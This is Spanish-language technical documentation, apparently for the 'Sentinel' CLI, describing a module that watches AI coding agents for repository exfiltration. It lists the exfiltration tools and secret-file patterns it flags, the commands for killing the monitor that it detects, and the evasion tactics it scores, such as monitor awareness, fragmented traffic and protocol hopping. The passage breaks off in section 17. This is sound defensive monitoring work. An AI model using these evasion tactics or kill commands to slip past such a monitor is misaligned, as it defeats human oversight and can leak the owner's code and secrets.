# Network Auditor — Documentación Técnica

> Módulo de detección de exfiltración de repositorios por agentes de IA.
> Versión: 1.0.0 | Estado: Alpha funcional

---

## Índice

1. [Arquitectura General](#1-arquitectura-general)
2. [Estructura del Código](#2-estructura-del-código)
3. [Modelo de Datos](#3-modelo-de-datos)
4. [Pipeline de Auditoría](#4-pipeline-de-auditoría)
5. [Motores de Inferencia](#5-motores-de-inferencia)
6. [Session DNA](#6-session-dna)
7. [Sistema de Riesgo](#7-sistema-de-riesgo)
8. [Captura de Telemetría](#8-captura-de-telemetría)
9. [Notificaciones](#9-notificaciones)
10. [Integración CLI](#10-integración-cli)
11. [Comandos](#11-comandos)
12. [Limitaciones Actuales](#12-limitaciones-actuales)
13. [Próximas Capas de Evolución](#13-próximas-capas-de-evolución)
14. [Anti-Evasion Score](#14-anti-evasion-score)
15. [Evidence Hash Chain](#19-evidence-hash-chain)
16. [MITRE ATT&CK Mapping](#20-mitre-attack-mapping)
17. [Behavior Timeline](#21-behavior-timeline)
18. [Mutation Lab para Comportamiento](#22-mutation-lab-para-comportamiento)

---

## 1. Arquitectura General

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          NetworkAuditor                                  │
│                                                                         │
│  ┌──────────────┐ ┌──────────┐ ┌──────────┐ ┌────────────────┐         │
│  │ Process      │ │  File    │ │   DNS    │ │  Connection     │         │
│  │ Monitor      │ │ Watcher  │ │ Observer │ │  Inspector      │         │
│  │ (poll 2s)    │ │(poll 5s) │ │(poll 3s) │ │  (poll 3s)      │         │
│  └──────┬───────┘ └────┬─────┘ └────┬─────┘ └────────┬───────┘         │
│         │              │            │                  │                │
│  ┌──────▼──────────────▼────────────▼──────────────────▼─────────────┐ │
│  │                   NetworkAuditPipeline                             │ │
│  │  Procesa eventos crudos → clasifica → genera evidencia             │ │
│  │  → evalúa riesgo → construye veredicto                             │ │
│  │  ┌──────────────────┐ ┌─────────────────┐ ┌──────────────────┐    │ │
│  │  │ Anti-Evasion     │ │ Evidence Chain   │ │ Canary System    │    │ │
│  │  │ Engine (8 señales)│ │ Correlator (4    │ │ (decoys, secrets, │    │ │
│  │  │ monitor awareness│ │ chains: exfil,   │ │  git contaminado) │    │ │
│  │  │ preparation, etc)│ │ prep, snapshot,  │ │                  │    │ │
│  │  │                  │ │ embedding)       │ │                  │    │ │
│  │  └──────────────────┘ └─────────────────┘ └──────────────────┘    │ │
│  └──────────────────────────────┬──────────────────────────────────────┘ │
│                                 │                                       │
│  ┌──────────────────────────────▼──────────────────────────────────────┐ │
│  │  Session DNA Builder                                                │ │
│  │  fingerprint + antiEvasionScore + evidenceChains + hasCanaryTrigger │ │
│  │  Comportamiento agregado + perfil de evasión                         │ │
│  └──────────────────────────────┬──────────────────────────────────────┘ │
│                                 │                                       │
│  ┌──────────────────────────────▼──────────────────────────────────────┐ │
│  │  AuditDatabase (SQLite local) — 14 tablas                           │ │
│  │  + NotificationProvider (toast/notify-send/terminal)                │ │
│  └─────────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────┘
```

### Principios de diseño

- **Auditar, no bloquear**: El módulo observa y alerta, nunca interfiere con el tráfico o los procesos.
- **Zero telemetry**: Todos los datos se almacenan localmente en SQLite. No hay transmisión externa.
- **Consentimiento explícito**: Pantalla legal obligatoria antes de iniciar cualquier captura.
- **Comportamiento sobre firma**: El motor de inferencia clasifica intenciones, no comandos literales.

---

## 2. Estructura del Código

### Core lógico (`src/core/network/`)

| Archivo | Líneas | Responsabilidad |
|---------|--------|-----------------|
| `types.ts` | 280+ | 35+ interfaces, tipos estrictos, enums, `generateId()` |
| `pipeline.ts` | 200+ | Orquestador con integración de anti-evasión, chains, canarios |
| `behavior-engine.ts` | 240+ | 8 classifiers: flujo, proceso, archivo, git, mass-read, embedding, canario, preparación |
| `risk-engine.ts` | 120+ | Evaluación de riesgo con pesos, multiplicadores, 4 niveles |
| `evidence-builder.ts` | 180+ | Construcción de objetos `Evidence` con nuevos builders de evasión/chain |
| `session-dna.ts` | 140+ | `buildSessionDna()` con antiEvasionScore, evidenceChains, hasCanaryTrigger |
| `anti-evasion-engine.ts` | 410 | 8 señales de evasión + monitor awareness + process chain + preparation |
| `evidence-chain.ts` | 280 | Correlador temporal: exfiltración, preparación, snapshot, embedding |
| `canary-system.ts` | 250 | Despliegue de archivos señuelo, secretos falsos, git contaminado |

### Capa CLI (`src/cli/network/`)

| Archivo | Líneas | Responsabilidad |
|---------|--------|-----------------|
| `auditor.ts` | 474 | Orquestador principal: ciclo de vida de sesión, dashboard, persistencia |
| `database.ts` | 367 | SQLite vía `better-sqlite3`: 11 tablas, CRUD completo |
| `legal-consent.ts` | 72 | Pantalla de consentimiento legal (14 puntos), almacena aceptación |
| `notification-provider.ts` | 130 | 3 backends: Windows Toast, Linux notify-send, terminal |
| `process-monitor.ts` | 140 | Polling `Get-CimInstance` (Win) / `ps` (Linux), detección de IA |
| `file-watcher.ts` | 120 | Snapshot de fs cada 5s, descubre `.git/`, detecta `.bundle` |
| `git-detector.ts` | 90 | Polling de procesos, clasifica comandos git |
| `dns-observer.ts` | 80 | Polling DNS cache (Win), detección de patrones AI/cloud |
| `connection-inspector.ts` | 90 | Polling TCP connections (Win `Get-NetTCPConnection` / Linux `ss`) |
| `http-interceptor.ts` | 118 | Proxy HTTP forward (puerto 8089), CONNECT tunnel |
| `tls-interceptor.ts` | 118 | Extracción SNI de ClientHello (puerto 9090), sin MITM |
| `websocket-observer.ts` | 70 | Gestión manual de flujos WebSocket |
| `render-network.ts` | 200 | 5 funciones de renderizado para dashboard y reportes |
| `export-network.ts` | 100 | Exportación a JSON, DNA JSON y Markdown |

---

## 3. Modelo de Datos

### Diagrama entidad-relación (SQLite — 14 tablas)

```
sessions ──┬── flows
           ├── processes
           ├── file_accesses
           ├── git_commands
           ├── behaviors
           ├── evidence
           ├── alerts
           ├── verdicts
           ├── evidence_chains
           ├── anti_evasion_signals
           └── canary_events

legal_consent  (independiente, 1 registro)
trusted_agents (independiente, N registros)
```

### Esquema detallado

```sql
CREATE TABLE sessions (
  id TEXT PRIMARY KEY,
  start_time TEXT NOT NULL,
  end_time TEXT,
  status TEXT NOT NULL DEFAULT 'running'
    CHECK(status IN ('running','stopped','expired')),
  agent_name TEXT,
  workspace TEXT,
  risk_score REAL DEFAULT 0,
  session_dna TEXT,
  created_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE flows (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  timestamp TEXT NOT NULL,
  protocol TEXT NOT NULL
    CHECK(protocol IN ('TCP','TLS','HTTP','WS','DNS')),
  source_addr TEXT,
  source_port INTEGER,
  dest_addr TEXT,
  dest_port INTEGER,
  hostname TEXT,
  sni TEXT,
  bytes_sent INTEGER DEFAULT 0,
  bytes_received INTEGER DEFAULT 0,
  duration_ms INTEGER DEFAULT 0,
  method TEXT,
  path TEXT,
  content_type TEXT,
  dns_query TEXT,
  status_code INTEGER
);

CREATE TABLE processes (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  timestamp TEXT NOT NULL,
  pid INTEGER NOT NULL,
  name TEXT NOT NULL,
  command_line TEXT,
  parent_pid INTEGER,
  parent_name TEXT,
  username TEXT,
  risk_indicators_json TEXT
);

CREATE TABLE file_accesses (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  timestamp TEXT NOT NULL,
  file_path TEXT NOT NULL,
  operation TEXT NOT NULL
    CHECK(operation IN ('read','write','open','create')),
  process_name TEXT,
  pid INTEGER,
  bytes_read INTEGER
);

CREATE TABLE git_commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  timestamp TEXT NOT NULL,
  pid INTEGER,
  process_name TEXT,
  command_line TEXT,
  action TEXT
    CHECK(action IN ('clone','bundle','archive','push','fetch',
                      'pack','rev-list','log','grep','other')),
  repository TEXT
);

CREATE TABLE behaviors (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  type TEXT NOT NULL,
  confidence REAL NOT NULL DEFAULT 0.5,
  evidence_json TEXT,
  flow_ids_json TEXT,
  created_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE evidence (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  category TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  data_json TEXT,
  created_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE alerts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  timestamp TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  severity TEXT NOT NULL
    CHECK(severity IN ('LOW','MEDIUM','HIGH','CRITICAL'))
);

CREATE TABLE legal_consent (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  accepted INTEGER NOT NULL DEFAULT 0,
  accepted_at TEXT,
  consent_version TEXT DEFAULT '1.0'
);

CREATE TABLE trusted_agents (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT NOT NULL UNIQUE,
  added_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE verdicts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  risk_level TEXT NOT NULL,
  risk_score REAL NOT NULL,
  summary TEXT,
  session_dna_id TEXT,
  created_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE evidence_chains (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  name TEXT NOT NULL,
  confidence REAL DEFAULT 0,
  steps_json TEXT,
  summary TEXT,
  created_at TEXT DEFAULT (datetime('now'))
);

CREATE TABLE anti_evasion_signals (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  type TEXT NOT NULL,
  score INTEGER DEFAULT 0,
  confidence REAL DEFAULT 0,
  evidence_json TEXT,
  details_json TEXT,
  timestamp TEXT NOT NULL
);

CREATE TABLE canary_events (
  id TEXT PRIMARY KEY,
  session_id TEXT NOT NULL REFERENCES sessions(id),
  type TEXT NOT NULL,
  canary_name TEXT,
  confidence REAL DEFAULT 0,
  process_name TEXT,
  pid INTEGER,
  detail TEXT,
  timestamp TEXT NOT NULL
);
```

---

## 4. Pipeline de Auditoría

El `NetworkAuditPipeline` ejecuta el siguiente flujo para cada evento:

```
Evento crudo
  │
  ├── Flow (red)
  │     → classifyFlow()
  │     → buildFlowEvidence()
  │
  ├── Process
  │     → classifyProcess()
  │     → buildProcessEvidence()
  │
  ├── FileAccess
  │     → classifyFileAccess()
  │     → computeMassReadBehavior()
  │     → computeEmbeddingBehavior()
  │     → buildFileAccessEvidence()
  │
  ├── GitCommand
  │     → classifyGitCommand()
  │     → buildGitCommandEvidence()
  │
  └── Todos los comportamientos
        → buildBehaviorEvidence()
        → assessRisk()
        → buildRiskEvidence()
        → buildSessionDna()
        → buildVerdict()
```

### Llamada desde el orquestador

```typescript
// auditor.ts — método handleFlow()
this.pipeline.processFlow(flow, this.session!.behaviors,
  this.session!.flows, this.db);

// auditor.ts — método handleProcess()
this.pipeline.processProcess(event, this.session!.behaviors,
  this.session!.processes, this.db, this.config);
```

---

## 5. Motores de Inferencia

### 5.1 Behavior Engine (`behavior-engine.ts`)

Ocho clasificadores que operan sobre eventos crudos:

```typescript
classifyFlow(flow: NetworkFlow): Behavior | null
classifyProcess(event: ProcessEvent): Behavior | null
classifyFileAccess(access: FileAccessEvent): Behavior | null
classifyGitCommand(cmd: GitCommandEvent): Behavior | null
classifyCanaryEvent(event: CanaryEventType): Behavior | null
classifyPreparationCommands(proc: ProcessEvent): Behavior | null
computeMassReadBehavior(accesses: FileAccessEvent[]): Behavior | null
computeEmbeddingBehavior(accesses: FileAccessEvent[]): Behavior | null
```

#### Tipos de comportamiento detectados

| Tipo | Disparado por | Confianza base |
|------|---------------|----------------|
| `DATA_UPLOAD` | HTTP POST/PUT >10KB a destino externo | 0.7 |
| `BUNDLE_CREATION` | Git bundle/archive | 0.9 |
| `CLONE_OPERATION` | Git clone | 0.8 |
| `PUSH_OPERATION` | Git push | 0.7 |
| `FETCH_OPERATION` | Git fetch (masivo) | 0.5 |
| `MASS_READ` | >100 archivos en ventana de tiempo | 0.6 |
| `EMBEDDING` | Lectura secuencial + escritura chunked | 0.7 |
| `CANARY_TRIGGER` | Archivo canario leído/abierto | 0.95 |
| `SECRET_ACCESS` | Acceso a archivos de secretos/credenciales | 0.85 |
| `WEB_SOCKET` | Conexión WebSocket establecida | 0.5 |
| `DNS_TUNNEL` | Consultas DNS a patrones sospechosos | 0.6 |
| `AI_INTERACTION` | Tráfico a API de IA (OpenAI, Anthropic, etc.) | 0.6 |

### 5.2 Risk Engine (`risk-engine.ts`)

Evalúa el riesgo combinando comportamientos activos con pesos y multiplicadores configurables.

#### Pesos base por comportamiento

```typescript
const BEHAVIOR_WEIGHTS: Record<BehaviorType, number> = {
  DATA_UPLOAD: 30,
  BUNDLE_CREATION: 40,
  CLONE_OPERATION: 20,
  PUSH_OPERATION: 25,
  FETCH_OPERATION: 10,
  MASS_READ: 20,
  EMBEDDING: 35,
  CANARY_TRIGGER: 50,
  SECRET_ACCESS: 35,
  WEB_SOCKET: 15,
  DNS_TUNNEL: 30,
  AI_INTERACTION: 15,
};
```

#### Multiplicadores

| Condición | Multiplicador |
|-----------|---------------|
| bundle + data_upload simultáneos | ×2.0 |
| >3 tipos de comportamiento activos | ×1.3 |
| AI agent detectado en procesos | ×1.5 |
| anti-evasión + exfiltración simultáneas | ×2.5 |
| Canario activado (cualquier tipo) | ×3.0 |
| Riesgo base < 20 | ×0.5 |

#### Niveles de riesgo

| Nivel | Score | Significado |
|-------|-------|-------------|
| `LOW` | 0–25 | Operación normal, sin indicadores |
| `MEDIUM` | 26–50 | Actividad sospechosa aislada |
| `HIGH` | 51–75 | Múltiples indicadores, posible exfiltración |
| `CRITICAL` | 76–100 | Exfiltración activa confirmada |

### 5.3 Evidence Builder (`evidence-builder.ts`)

Cada evidencia sigue esta estructura:

```typescript
interface Evidence {
  id: string;
  sessionId: string;
  category: 'flow' | 'process' | 'file_access' | 'git_command'
         | 'behavior' | 'risk';
  title: string;         // Frase corta legible
  description: string;   // Texto detallado forense
  data: Record<string, unknown>;
  timestamp: Date;
}
```

---

## 6. Session DNA

El Session DNA es la huella digital de una sesión de auditoría. No almacena trazas individuales sino el **comportamiento agregado**.

### Algoritmo de generación

```typescript
buildSessionDna(
  sessionId: string,
  startTime: Date,
  flows: NetworkFlow[],
  behaviors: Behavior[],
  evidence: Evidence[],
  risk: RiskAssessment,
  antiEvasionSignals?: AntiEvasionSignal[],
  evidenceChains?: EvidenceChain[]
): SessionDna
```

### Estructura completa

```typescript
interface SessionDna {
  sessionId: string;
  startTime: Date;
  endTime?: Date;
  durationMs: number;
  totalFlows: number;
  totalBytesSent: number;
  totalBytesReceived: number;
  uniqueHosts: string[];
  repositoriesAccessed: string[];
  behaviors: BehaviorType[];
  topRiskFactor: string;
  riskScore: number;
  riskLevel: string;
  verdictSummary: string;
  confidence: number;
  antiEvasionScore: number;              // 0–100
  antiEvasionSignals: AntiEvasionSignalType[];  // señales detectadas
  evidenceChains: string[];              // nombres de cadenas
  preparationSignals: string[];          // señales de preparación
  processChains: string[];               // descripción de cadenas de procesos
  hasCanaryTrigger: boolean;             // ¿se activó algún canario?
}
```

### Filosofía

El Session DNA está diseñado para resistir cambios de implementación. Aunque un atacante cambie de `git bundle` a lectura en memoria + DNS, el ADN capturará:

- Cuántos archivos se leyeron
- Cuánto tiempo duró la operación
- Cuántos datos se transmitieron
- Qué tipos de comportamiento se activaron
- La correlación temporal entre eventos
- Señales de evasión (anti-evasion score)
- Cadenas de evidencia completas
- Disparo de canarios

---

## 7. Sistema de Riesgo

### Flujo de evaluación

```
assessRisk(contexto):
  1. Colectar comportamientos activos del contexto
  2. Para cada comportamiento:
     score += BEHAVIOR_WEIGHTS[tipo] * confianza
  3. Aplicar multiplicadores contextuales
  4. Normalizar score a rango 0–100
  5. Asignar nivel según thresholds
  6. Verificar si corresponde alerta
```

### Alerta automática

```typescript
// En HIGH con confianza >0.7 o CRITICAL
if ((level === 'HIGH' && confidence > 0.7) || level === 'CRITICAL') {
  enviar notificación (toast / notify-send / terminal)
  persistir alerta en DB
}
```

---

## 8. Anti-Evasion Engine

Detecta **esfuerzos activos para evadir la detección**, no exfiltración directa.

### 8.1 Señales de evasión (8 tipos)

| Señal | Peso | Detección |
|-------|------|-----------|
| `artificial_rhythm` | 20 | CV < 0.15 en intervalos de acceso a archivos, avg > 50ms |
| `fragmented_traffic` | 25 | >5 chunks a mismo destino, avg < 50KB, ventana > 60s |
| `protocol_hopping` | 30 | ≥3 protocolos distintos en < 120s |
| `custom_compression` | 20 | Content-Encoding no estándar o detección de XOR/Base85 |
| `monitor_awareness` | 40 | Caída >50% de procesos activos tras inicio del monitor |
| `memory_only_ops` | 25 | Ratio read/write > 20, contenido Git leído sin escritura local |
| `distributed_chain` | 35 | Detección de proceso AI + ≥2 downstream tools (curl, python, etc.) |
| `no_temp_files` | 15 | >100 reads sin accesos a directorios temp |

### 8.2 Monitor Awareness Detection

```typescript
detectMonitorAwareness(context, currentProcessCount, sessionId):
  - Si processCount cae >50% tras 10s de monitorización
  - Señal: monitor_awareness (score 40, confianza 0.7)
```

### 8.3 Process Chain Detection

Detecta cadenas distribuidas:
```
Cursor (AI agent)
  → node.exe (compresión/lectura)
    → powershell (transformación)
      → curl (transmisión)
```

### 8.4 Preparation Phase Detection

Detecta comandos pre-operativos antes de exfiltración:
```
git cat-file   → preparación de objetos
git rev-list   → enumeración de historia
git ls-tree    → listado de árbol
git pack-objects → empaquetado
git count-objects → verificación de tamaño
```

### 8.5 Anti-Evasion Score

```
computeAntiEvasionScore(signals):
  score = sum(signal.score * signal.confidence)
  return min(100, score)

Interpretación:
  0-20:  Comportamiento normal
  21-50: Anomalías menores
  51-75: Evasión probable
  76-100: Evasión activa confirmada
```

---

## 9. Evidence Chain Correlator

Correlaciona eventos individuales en **cadenas temporales de evidencia** que revelan la intención completa.

### 9.1 Cadenas detectadas

| Cadena | Inputs | Confianza base |
|--------|--------|----------------|
| `repository_exfiltration_chain` | flows + processes + fileAccesses + gitCommands + behaviors | 0.5 + 0.1×pasos |
| `pre_operational_snapshot` | gitCommands (prep) + behaviors | 0.7–0.9 |
| `full_snapshot_transfer` | fileAccesses + flows | 0.75 |
| `ai_embedding_chain` | fileAccesses + behaviors (embedding + AI conn) | 0.7 |

### 9.2 Ejemplo de cadena de exfiltración

```
1. repo_read       → Git objects/history accessed
2. compression     → Bundle/archive created
3. connection_open → TCP socket opened to external host
4. data_transmit   → Data uploaded (POST/PUT)
```

Aunque cada paso cambie de implementación (ej: memoria en vez de bundle, DNS en vez de HTTPS), el **patrón completo** sigue siendo detectable.

---

## 10. Canary System

Despliega archivos señuelo, credenciales falsas e historial Git contaminado para detectar accesos no autorizados.

### 10.1 Archivos señuelo (15 nombres predefinidos)

```
customer_data_2026_q2.csv
api_keys_internal.json
database_dump_backup.sql
company_secrets.txt
vpn_credentials.ovpn
ssh_private_bastion.key
github_token_recovery.md
aws_credentials_prod.json
master_decryption_key.asc
board_minutes_confidential.pdf
...
```

### 10.2 Fake secrets

Archivo `.secrets.env` con credenciales falsas pero verosímiles:
- AWS_ACCESS_KEY_ID con formato `AKIA...`
- GITHUB_TOKEN con formato `ghp_...`
- OPENAI_API_KEY con formato `sk-live-...`
- Claves privadas SSH/OpenSSL falsas

### 10.3 Contaminated Git history

Archivo `.git_canary_commit` dentro de `.sentinel/canaries/` que simula un commit canario. Cualquier acceso a través de comandos Git es detectable.

### 10.4 Canary markers

Cada canario contiene un marcador único:
```
SENTINEL_CANARY_TOKEN_<timestamp>_<random>
```
Este marcador se busca en el body del tráfico saliente para detectar exfiltración confirmada (confianza 0.99).

### 10.5 Eventos canario

| Tipo | Confianza | Acción |
|------|-----------|--------|
| `decoy_file_read` | 0.95 | Archivo señuelo leído |
| `decoy_file_modified` | 0.95 | Archivo señuelo modificado |
| `fake_secret_read` | 0.95 | Secrets falsos accedidos |
| `contaminated_git_read` | 0.95 | Git canario leído |
| `decoy_exfiltrated` | 0.99 | Canary marker detectado en tráfico saliente |

### 10.6 Multiplicador de riesgo

La activación de cualquier canario aplica un multiplicador **×3.0** al score de riesgo.

---

## 11. Configuración de Anti-Evasión y Canarios

En `NetworkAuditConfig`:

```typescript
interface NetworkAuditConfig {
  // ... config existente ...
  antiEvasionEnabled: boolean;       // default: true
  processChainDetection: boolean;    // default: true
  preparationDetection: boolean;     // default: true
  canaryConfig: CanaryConfig;
}

interface CanaryConfig {
  enabled: boolean;                  // default: true
  decoyFiles: string[];              // nombres adicionales
  fakeSecrets: boolean;              // default: true
  contaminatedGitHistory: boolean;   // default: true
  autoDeploy: boolean;               // default: false
}
```

---

## 12. Captura de Telemetría

### 8.1 Process Monitor (`process-monitor.ts`)

- **Frecuencia**: cada 2 segundos
- **Windows**: `Get-CimInstance Win32_Process` (PowerShell)
- **Linux**: `ps aux` (parseo)
- **Detecciones**:
  - Agentes IA conocidos por nombre de proceso
  - Comandos peligrosos (bundle, pack-objects, tar, rsync, curl, nc, etc.)
  - Procesos child sospechosos

### 8.2 File Watcher (`file-watcher.ts`)

- **Frecuencia**: cada 5 segundos
- **Mecanismo**: snapshot de estructura de directorios usando `fs.readdirSync` recursivo
- **Detecciones**:
  - Archivos `.bundle` creados
  - Archivos de secretos accedidos (`.env`, `credentials`, `*.pem`, `*.key`, `token*`, `secret*`)
  - Directorios `.git/` descubiertos
  - Lectura masiva de archivos (>100 en ventana)

### 8.3 Git Detector (`git-detector.ts`)

- **Frecuencia**: cada 2 segundos
- **Windows**: `Get-CimInstance Win32_Process -Filter "Name LIKE '%git%'"` (PowerShell)
- **Linux**: `ps aux | grep git`
- **Acciones clasificadas**: `clone`, `bundle`, `archive`, `push`, `fetch`, `pack`, `rev-list`, `log`, `grep`

### 8.4 DNS Observer (`dns-observer.ts`)

- **Frecuencia**: cada 3 segundos
- **Windows**: `Get-DnsClientCache` (PowerShell)
- **Patrones detectados**: `openai.com`, `anthropic.com`, `githubcopilot.com`, `azure.com`, `awscloud`, `ngrok.io`, `replit`, `codeshare`, `transfer.sh`, `pastebin`

### 8.5 Connection Inspector (`connection-inspector.ts`)

- **Frecuencia**: cada 3 segundos
- **Windows**: `Get-NetTCPConnection` (PowerShell)
- **Linux**: `ss -tun`
- **Filtros**: excluye IPs privadas (10.x, 192.168.x, 172.16-31.x, 127.x)
- **Puertos sospechosos**: 22 (SSH), 1080 (SOCKS), 3128/8080 (proxies), 8443, 9000, 27017 (Mongo), 6379 (Redis)

### 8.6 HTTP Interceptor (`http-interceptor.ts`)

- **Puerto**: 8089 (localhost únicamente)
- **Mecanismo**: Proxy HTTP forward usando `http.createServer`
- **HTTP**: captura método, ruta, headers, body (opcional), content-type
- **HTTPS**: tuneliza CONNECT, captura hostname:puerto
- **No inspecciona** el contenido del túnel TLS (solo registro de conexión)

### 8.7 TLS Interceptor (`tls-interceptor.ts`)

- **Puerto**: 9090 (localhost únicamente)
- **Mecanismo**: Servidor TCP raw, extrae SNI del ClientHello TLS v1.x
- **Extracción**: Analiza bytes del handshake TLS (ContentType=0x16, HandshakeType=0x01, extensión SNI type=0x00)
- **Limitación**: Sin MITM real. Solo observación pasiva del SNI.

---

## 13. Notificaciones

```typescript
class NotificationProvider {
  sendAlert(title: string, description: string, severity: string): void
}
```

### Backends

| Plataforma | Mecanismo | Requisito |
|------------|-----------|-----------|
| Windows | `New-BurntToastNotification` (PowerShell) | Módulo BurntToast |
| Linux | `notify-send` (libnotify) | Paquete libnotify-bin |
| Fallback | `console.log` con colores y bordes | Ninguno |

### Umbrales de notificación

- `MEDIUM`: log en consola
- `HIGH`: notificación + log
- `CRITICAL`: notificación + log + énfasis visual

---

## 14. Integración CLI

### Registro en Commander (`src/cli/main.ts`)

```typescript
const networkCmd = program.command('network')
  .description('Audit AI agent network activity and detect repository exfiltration');

networkCmd.command('start')
  .description('Start a network audit session')
  .option('--http-proxy', 'Enable HTTP proxy interception (port 8089)')
  .option('--tls', 'Enable TLS interception (port 9090)')
  .action(async (options) => { ... });
```

### Hub Menu (`src/cli/hub.ts`)

```
Hub:
  1-9: Funcionalidades existentes
  10: Network Auditor ─┬─ 1. Start Audit
                         ├─ 2. Stop Audit & Get Verdict
                         ├─ 3. Status
                         ├─ 4. Live Events
                         ├─ 5. Session History
                         ├─ 6. Replay Session
                         ├─ 7. Export Session
                         ├─ 8. Settings (thresholds, trusted, CLI commands)
                         ├─ 9. Auto-start (toggle on/off, register/remove OS task)
                         └─ 0. Back to Main Menu
  11: Exit
```

- **Settings** muestra la configuración actual (alert threshold, trusted hosts/processes, performance budget) y los comandos CLI avanzados disponibles.
- **Auto-start** persiste la preferencia en `~/.sentinel/network-config.json` y registra/elimina una tarea programada:
  - Windows: `ScheduledTask 'SentinelNetworkMonitor'` (ejecuta `sentinel-cli network start` al iniciar sesión)
  - Linux: systemd user service `sentinel-network.service`

---

## 15. Comandos

```
sentinel-cli network start                     Inicia sesión de auditoría
                     --http-proxy          Habilita proxy HTTP (puerto 8089)
                     --tls                 Habilita interceptor TLS (puerto 9090)

sentinel-cli network stop                      Detiene auditoría y muestra veredicto

sentinel-cli network status                    Estado actual de la sesión

sentinel-cli network history -l <N>            Últimas N sesiones (default: 10)

sentinel-cli network session <id>              Detalle completo de una sesión

sentinel-cli network export <id>               Exporta sesión (json|markdown)
                          --format <fmt>

sentinel-cli network trusted list              Lista agentes confiables
sentinel-cli network trusted add <name>        Añade agente confiable
sentinel-cli network trusted remove <name>     Elimina agente confiable

sentinel-cli network doctor                    Health check completo
                      --metrics            Muestra métricas runtime
                      --coverage           Reporte de cobertura de sensores
                      --drift              Test de deriva de confianza

sentinel-cli network blindspots list           Lista puntos ciegos registrados
sentinel-cli network blindspots add            Registra nuevo punto ciego
sentinel-cli network blindspots stats          Estadísticas de puntos ciegos

sentinel-cli network campaign list             Lista campañas de validación
sentinel-cli network campaign run [tag]        Ejecuta campaña (opcional: filtro por tag)
sentinel-cli network campaign show <id>        Muestra detalle de campaña

sentinel-cli network replay run <file/dir>     Replay de sesiones grabadas
sentinel-cli network replay campaign <dir>     Ejecuta campaña de replay
sentinel-cli network replay diff <baseline>    Compara contra línea base

sentinel-cli network benchmark history         Historial de benchmarks del pipeline

sentinel-cli network record [sec] [dir] [tags] Graba sesión real y la procesa
                      --profile <id>       Perfil canónico para etiquetado

sentinel-cli network corpus coverage           Cobertura del corpus vs perfiles
```

### Configuración persistente

Las preferencias de red se almacenan en `~/.sentinel/network-config.json`:

```json
{
  "autoStart": false,
  "alertThreshold": "MEDIUM",
  "trustedHosts": [],
  "trustedProcesses": [],
  "performanceBudget": {
    "maxCpuPercent": 5,
    "maxMemoryMb": 128,
    "maxEventsPerSecond": 1000,
    "providerTimeoutMs": 3000
  }
}
```

### Auto-start

El monitor puede iniciarse automáticamente al iniciar sesión:

| Plataforma | Mecanismo | Comando |
|-----------|-----------|---------|
| Windows | Scheduled Task | `Register-ScheduledTask -TaskName SentinelNetworkMonitor` |
| Linux | systemd user service | `systemctl --user enable sentinel-network.service` |

La activación se realiza desde el menú Hub (opción 9) o configurando `autoStart: true` en `~/.sentinel/network-config.json`.

### Kill Detection (`monitor_disabled`)

El `BehaviorEngine` detecta intentos de deshabilitar el monitor detectando procesos cuyo command line contiene `taskkill`, `Stop-Process`, o `wmic process` combinado con `sentinel` o el PID del proceso Sentinel. La detección asigna el comportamiento `monitor_disabled` con peso 80 en el risk engine y confianza 0.9.

Comandos detectados:
- `taskkill /F /IM sentinel.exe` / `taskkill /PID <PID> /F`
- `Stop-Process -Name sentinel` / `Stop-Process -Id <PID>`
- `wmic process where name="sentinel.exe" delete`

### Ejemplo de uso

```bash
# Iniciar auditoría básica
sentinel-cli network start

# Iniciar con interceptores de red
sentinel-cli network start --http-proxy --tls

# Ver estado durante la sesión
sentinel-cli network status

# Detener y obtener veredicto
sentinel-cli network stop

# Ver historial
sentinel-cli network history -l 5

# Exportar sesión a markdown
sentinel-cli network export <session-id> --format markdown
```

---

## 16. Limitaciones Actuales

| Área | Limitación | Impacto | Mitigación propuesta |
|------|-----------|---------|---------------------|
| **Captura TLS** | Sin MITM real, solo SNI | No inspecciona contenido HTTPS cifrado | Integrar `node-forge` para CA local + generación de certificados por host |
| **Proxy HTTP** | Requiere configuración manual del cliente | Solo captura tráfico dirigido al proxy explícitamente | Implementar redirección con firewall (netsh/iptables) |
| **DNS** | Usa caché local (Windows) | No captura consultas en tiempo real | Migrar a captura de paquetes raw (pcap/napi) |
| **File watching** | Polling cada 5s, snapshot | Alta latencia, no captura accesos efímeros | Migrar a `fs.watch` / `ReadDirectoryChangesW` / `inotify` |
| **Process monitoring** | Polling cada 2s | Ventana de evasión de 2s | Hooks nativos del SO (ETW, eBPF) |
| **V3 scanner** | Sin detección adversarial | No cubre vectores de ataque adversarial | Implementar en `packages/sentinel-core/scanner/` |
| **Exportación** | Solo JSON/Markdown | Sin PDF nativo | Integrar puppeteer/wkhtmltopdf |
| **Memoria** | Sin análisis de uso de RAM | No detecta lectura completa en RAM sin tocar disco | Monitorear working set de procesos |

---

## 17. Próximas Capas de Evolución

Basado en el análisis de evasión, el módulo debe evolucionar en capas progresivas:

### Capa 1: Endurecimiento de Captura

- Migrar de polling a eventos del SO
